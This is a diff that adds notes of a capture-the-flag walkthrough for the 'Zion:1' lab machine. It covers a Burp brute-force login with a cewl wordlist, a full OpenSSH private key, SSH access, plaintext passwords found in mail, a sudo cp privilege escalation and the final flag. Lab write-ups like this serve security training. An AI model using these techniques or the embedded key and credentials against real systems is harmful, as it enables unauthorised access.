@@ -16,4 +16,129 @@ Nmap done: 1 IP address (1 host up) scanned in 114.49 seconds
 
 
 
+Matrix banner:Rm9yZ2V0IGl0LCBnaXZlIHVwIHRyeWluZy4gVGhpcyBwYXRoIGlzIG5vdCBmb3IgeW91ISE
+
+base64: Forget it, give up trying. This path is not for you!!
+
+
+Using Burp to brutforce login with cewl dict list
+
+morpheus.thematrix:interpreted
+
+
+
+The user w.rabbit forgot his password.
+
+
+
+Find private key to ssh:
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA4WNRk13m7zHx9Ygsnf3iHC2x8WuTkb0n3WbxrrlyfHBXBTPSbwNn
+dpW5BWPHQN05Uj+Y6SWHJqdSv8QdPhxkYSHVdqoBcA/lXrkjzSpa4eKoXyJCsXk3ZUY4z/
+YLY1r/lP9glpLZQ5A4T8jbz11fJ4XmhGNB5gCeuYmi7GO6jaElIHSX+bXX8iON1GjGnl+M
+DrUSEu1bLlkVoZ0RDZE8qLpyQHyzeNBD1Pwr9wd/X20+5Aop/H13NRH7F+qb41oyC2QxyL
+wQda63utkVm05kd9klYh5TVXAkzwLF5v2YMlsur7c4LmS/afhAeMIZyw5DvfADjTmNC31Q
+4RVURrY3WnlyVC/ijmCMFKHHO53ld8E3fQe82XaXitwl1bKOiAGTAPTguG7Jgkfrjhmh0W
+qw/Jcyz4H9A+hVQ8KCz7IdM8E0l/O23JMWvlaC3j/gfQuInDF/w8xmOX/pNVzoiwsmxy4c
+OdSWtdXRrEJU3wcUB07cbioWtQrjWnnfzDFMSYyBAAAFiCoCcSQqAnEkAAAAB3NzaC1yc2
+EAAAGBAOFjUZNd5u8x8fWILJ394hwtsfFrk5G9J91m8a65cnxwVwUz0m8DZ3aVuQVjx0Dd
+OVI/mOklhyanUr/EHT4cZGEh1XaqAXAP5V65I80qWuHiqF8iQrF5N2VGOM/2C2Na/5T/YJ
+aS2UOQOE/I289dXyeF5oRjQeYAnrmJouxjuo2hJSB0l/m11/IjjdRoxp5fjA61EhLtWy5Z
+FaGdEQ2RPKi6ckB8s3jQQ9T8K/cHf19tPuQKKfx9dzUR+xfqm+NaMgtkMci8EHWut7rZFZ
+tOZHfZJWIeU1VwJM8Cxeb9mDJbLq+3OC5kv2n4QHjCGcsOQ73wA405jQt9UOEVVEa2N1p5
+clQv4o5gjBShxzud5XfBN30HvNl2l4rcJdWyjogBkwD04LhuyYJH644ZodFqsPyXMs+B/Q
+PoVUPCgs+yHTPBNJfzttyTFr5Wgt4/4H0LiJwxf8PMZjl/6TVc6IsLJscuHDnUlrXV0axC
+VN8HFAdO3G4qFrUK41p538wxTEmMgQAAAAMBAAEAAAGAfKZmFj9nmcAgle9S5ankpDrtX5
+xkR8S6SGtHnJ85XvLuXZU0e2sBjIbvhbiSGSCANCmyErdLkKgXTrFSjug657FDklYhZ22T
+KBjyYORc0PJ+teaHxglJBryYbQMhdzh7g1bdf0kF2aToT8/BKWT1XDFktLEEYATVw70IGv
+5ozS1jEBkLd/IG1QauyNuNhUdIeVXRAiC9PdvM582rAbriNlqvF1UgGN/ts9wnIH7IBemw
+T4QDhn2JMROZr7dzsYBOhP4yZ16vPKevxO5rXJBUGU2+BM0ZYLs20ygXnr6KM/powHCkSF
+vmCja9vbZfaTKFPS20OFbLy2xbbw7Syjc4beXbV/Qvok4EVTx1lvdZ4EdKYJQMoj7X3vuK
+brmpFe2SHieSOAgeE/lrV+UmOElPCFq4867AXMGz9tgUznLkhSvGL2DqhFoqM75zc5wv4u
+RZ/BiNIpY+yOeTk5tfzR66G92F2qWClgwLjk48oDBPcvxdMoXnNQXONf2x78cxthvxAAAA
+wClThtKaLnmdLGwDpaWdgoZEgD3DU2xFY/sxJefYagBdkMRzUCxoResMyJOk95K9oh35kJ
+06Jd2kt05rMGn8eSjlA3i78mI0/QqOlfRpfhEUz/ZNCYGxWYKNRqNtrfoLKTDQraA2xhAd
+p34+NBGgc8vEehv4l8W31OzFt+O9Nf+GARikR8AYIPcVzu2hjRwONkSSNkvoWH0rl8BBjn
+vapJp+xMW68mnwi/RM/u/5OHNcqENRpF3N0+JVnzr6N9c/rQAAAMEA/d+HPzbk4UPLiUKq
+fje1lhZfCji7etC+Dh2Jj0l1CgL9oVLz/Qt7+N2zB9evJ44ZLdQtXPas8HJlDHn0UjoUat
+DW0ENrqFJ9gq+J2j3hDZt2EmQiU8XAkhX1shmk/8fG40pdYF3r1qy+bcjZ4xZWN6VSkqvI
+4/l8hhmR82h6pT+Rd4m9F209HvMbP2wQNsB8plez18uNsDkTOw+HVABLlgFQQUmQChIgRq
+lG42KN5zGQkFyF0JrFREHFJBBnEG7tAAAAwQDjRrMEEggCA/RgGnsrBOTKJKUkqSOrCrTN
++EBBtU2Yg/L3UF1bvzHIjYSaHRYBWQivAoxUeSzWRMv69RrUKEPtQyGLg0Gawh4dM+KKIR
+YuSXnMWKC+IND/Z0k7bzae/9veUBFyu8pv4Kc3PRwOSTpfnsGA5CjtHSsFfaH71yLe2n6u
+I+k4MWTtetE/b72ptCyGXvf3Tv0dW6BE4ZvkKwFtXmx2lJvlHnLkvb2U048tnPzhlov6G3
+ceLgv/YmiizWUAAAATdy5yYWJiaXRAemlvbnNlcnZlcg==
+
+
+
+
+hack@kali:~/CTF/Zion:1$ ssh w.rabit@192.168.1.20 -i id_rsa_w.rabbit 
+
+ _______              _____                          
+|___  (_)            / ____|                         
+   / / _  ___  _ __ | (___   ___ _ ____   _____ _ __ 
+  / / | |/ _ \| '_ \ \___ \ / _ \ '__\ \ / / _ \ '__|
+ / /__| | (_) | | | |____) |  __/ |   \ V /  __/ |   
+/_____|_|\___/|_| |_|_____/ \___|_|    \_/ \___|_|   
+   
+Last login: Sun May  3 03:23:21 2020 from 192.168.138.130
+[w.rabbit@zionserver ~]$ 
+[w.rabbit@zionserver ~]$ 
+[w.rabbit@zionserver ~]$ 
+[w.rabbit@zionserver ~]$ ls
+backup  personal  scripts  warning.txt
+
+
+[w.rabbit@zionserver ~]$ cat warning.txt 
+
+Congratulations on making it this far.
+The goal is to read the /home/dozer/flag.txt file.
+
+Use the method and techniques you prefer.
+
+[w.rabbit@zionserver mail]$ cat w.rabbit 
+
+Remember to write down the new password before I forget it.
+
+OLDPASS: Admin129
+NEWPASS: P@s5w0rd#2020
+
+[w.rabbit@zionserver mail]$ sudo -l
+[sudo] password for w.rabbit: 
+User w.rabbit may run the following commands on zionserver:
+    (dozer) /bin/cp
+
+
+[w.rabbit@zionserver ~]$ /bin/sudo -u dozer /bin/cp --no-preserve=mode,ownership /home/dozer/flag.txt /tmp/flag12.txt
+[w.rabbit@zionserver ~]$ 
+[w.rabbit@zionserver ~]$ cat /tmp/flag12.txt
+
+__        __   _
+\ \      / /__| | ___ ___  _ __ ___   ___
+ \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
+  \ V  V /  __/ | (_| (_) | | | | | |  __/
+   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
+
+ _____   _____ _          ______
+|_   _|_|_   _| |__   ___|__  (_) ___  _ __
+  | |/ _ \| | | '_ \ / _ \ / /| |/ _ \| '_ \
+  | | (_) | | | | | |  __// /_| | (_) | | | |
+  |_|\___/|_| |_| |_|\___/____|_|\___/|_| |_|
+
+----------------------------------------------
+Congratulations!!
+
+Hope you enjoyed Zion:1. Just wanted to send a big thanks out there
+to all those who have privied feedback, and who have taken time to
+complete these little challenges. 
+
+If you enjoyed this CTF, send me a tweet via @mrhenrike
+
+So, take your award:
+
+flag = challUG{Th1nk_0u7_0f_th3_60x}
+
+
+[w.rabbit@zionserver ~]$ 
+
 
